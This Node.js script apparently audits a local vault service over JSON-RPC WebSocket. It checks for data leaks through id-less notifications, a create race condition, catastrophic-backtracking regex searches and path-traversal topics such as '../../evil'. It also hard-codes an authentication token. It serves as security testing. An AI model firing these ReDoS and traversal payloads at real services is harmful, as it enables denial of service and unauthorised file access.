// Targeted deep investigation - longer connect timeout
const WebSocket = require("ws");

const TOKEN = "2cbaffa84f141fef08bc13f86d1384b94d824b151058b1f2bd72c145165b6e26";
const URL = "ws://127.0.0.1:48765";

async function authedWs() {
  return new Promise((resolve, reject) => {
    const ws = new WebSocket(URL);
    const t = setTimeout(() => { ws.terminate(); reject(new Error("connect timeout")); }, 15000);
    ws.on("open", () => {
      ws.send(JSON.stringify({ jsonrpc: "2.0", method: "authenticate", params: { token: TOKEN }, id: "__auth__" }));
    });
    ws.on("message", (data) => {
      const msg = JSON.parse(data.toString());
      if (msg.id === "__auth__") {
        clearTimeout(t);
        if (msg.result && msg.result.ok) resolve(ws);
        else reject(new Error("auth failed: " + JSON.stringify(msg)));
      }
    });
    ws.on("error", (e) => { clearTimeout(t); reject(e); });
  });
}

function waitMsg(ws, matchId, timeoutMs = 5000) {
  return new Promise((resolve) => {
    const t = setTimeout(() => { ws.removeListener("message", handler); resolve({ timeout: true }); }, timeoutMs);
    function handler(data) {
      try {
        const msg = JSON.parse(data.toString());
        if (matchId === null || msg.id === matchId) {
          clearTimeout(t);
          ws.removeListener("message", handler);
          resolve(msg);
        }
      } catch { /* ignore parse errors */ }
    }
    ws.on("message", handler);
  });
}

async function main() {
  console.log("Connecting...");

  // VULN-1: Notification without id leaks vault data
  console.log("\n=== DEEP VULN-1: Notification (no id) leaks vault content ===");
  {
    const ws = await authedWs();
    console.log("Connected.");

    // Send notification (no id) for vault.read
    ws.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.read", params: { path: "Welcome.md" } }));
    const resp = await waitMsg(ws, null, 3000);
    if (resp.timeout) {
      console.log("  vault.read notification: no response (server correctly ignores notifications)");
    } else {
      console.log("  vault.read notification response:", JSON.stringify(resp).slice(0, 300));
      if (resp.result && resp.result.content) {
        console.log("  CONFIRMED VULN: content leaked =", resp.result.content.slice(0, 100));
      }
    }

    // Also try vault.list notification
    ws.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.list", params: {} }));
    const resp2 = await waitMsg(ws, null, 3000);
    if (resp2.timeout) {
      console.log("  vault.list notification: no response");
    } else {
      console.log("  vault.list notification response:", JSON.stringify(resp2).slice(0, 300));
    }

    ws.close();
  }

  await new Promise(r => setTimeout(r, 1000));

  // VULN-2: TOCTOU race on create - 5 trials
  console.log("\n=== DEEP VULN-2: TOCTOU race on simultaneous vault.create ===");
  {
    const RACE_FILE = "_attack_race_deep2.md";
    let doubleCreates = 0;
    const TRIALS = 5;

    for (let trial = 0; trial < TRIALS; trial++) {
      const [ws1, ws2] = await Promise.all([authedWs(), authedWs()]);
      let r1 = null, r2 = null;

      await new Promise(resolve => {
        let done = 0;
        function check() { if (++done === 2) resolve(); }
        const t1 = setTimeout(() => { r1 = { timeout: true }; check(); }, 5000);
        const t2 = setTimeout(() => { r2 = { timeout: true }; check(); }, 5000);

        ws1.once("message", d => { clearTimeout(t1); try { r1 = JSON.parse(d.toString()); } catch { r1 = {}; } check(); });
        ws2.once("message", d => { clearTimeout(t2); try { r2 = JSON.parse(d.toString()); } catch { r2 = {}; } check(); });

        ws1.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.create", params: { path: RACE_FILE, content: `c1_${trial}`, dryRun: false }, id: `t${trial}a` }));
        ws2.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.create", params: { path: RACE_FILE, content: `c2_${trial}`, dryRun: false }, id: `t${trial}b` }));
      });

      const ok1 = !!r1?.result?.ok, ok2 = !!r2?.result?.ok;
      const err1 = r1?.error?.message, err2 = r2?.error?.message;

      if (ok1 && ok2) {
        doubleCreates++;
        console.log(`  Trial ${trial}: RACE - both clients reported ok:true`);
        // Read what's actually in the file
        const ws3 = await authedWs();
        ws3.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.read", params: { path: RACE_FILE }, id: "read" }));
        const readR = await waitMsg(ws3, "read");
        console.log(`    File content: '${readR.result?.content}'`);
        ws3.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.delete", params: { path: RACE_FILE, dryRun: false }, id: "del" }));
        await waitMsg(ws3, "del");
        ws3.close();
      } else {
        console.log(`  Trial ${trial}: ok1=${ok1} ok2=${ok2} err1='${err1}' err2='${err2}'`);
        const winner = ok1 ? ws1 : (ok2 ? ws2 : null);
        if (winner) {
          winner.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.delete", params: { path: RACE_FILE, dryRun: false }, id: "del" }));
          await waitMsg(winner, "del");
        }
      }
      ws1.close(); ws2.close();
      await new Promise(r => setTimeout(r, 200));
    }

    console.log(`\nSummary: ${doubleCreates}/${TRIALS} trials both clients got ok:true`);
    if (doubleCreates > 0) {
      console.log("CONFIRMED: TOCTOU race - exists() check and create() are not atomic");
    } else {
      console.log("Race not reproduced in this run (timing-dependent)");
    }
  }

  await new Promise(r => setTimeout(r, 1000));

  // ReDoS characterization
  console.log("\n=== DEEP: ReDoS pattern timing ===");
  {
    const ws = await authedWs();
    for (const [pat, label] of [
      ["(a+)+$", "classic"],
      ["(.*a){20}", "slow-original"],
      ["([a-zA-Z]+)*", "alternation"],
    ]) {
      const start = Date.now();
      ws.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.search", params: { query: pat, regex: true }, id: `rd_${label}` }));
      const resp = await waitMsg(ws, `rd_${label}`, 12000);
      const ms = Date.now() - start;
      console.log(`  '${pat}' (${label}): ${resp.timeout ? "TIMEOUT >12s" : ms + "ms"}`);
    }
    ws.close();
  }

  // vault.init error message info leak
  console.log("\n=== DEEP: vault.init error message quality ===");
  {
    const ws = await authedWs();
    ws.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.init", params: { topic: "../../evil" }, id: "init1" }));
    const r1 = await waitMsg(ws, "init1");
    console.log("  topic=../../evil:", JSON.stringify(r1).slice(0, 200));
    // Check if absolute path topic works
    ws.send(JSON.stringify({ jsonrpc: "2.0", method: "vault.init", params: { topic: "/absolute/path" }, id: "init2" }));
    const r2 = await waitMsg(ws, "init2");
    console.log("  topic=/absolute/path:", JSON.stringify(r2).slice(0, 200));
    ws.close();
  }

  console.log("\nDone.");
}

main().catch(e => console.error("Fatal:", e.message));
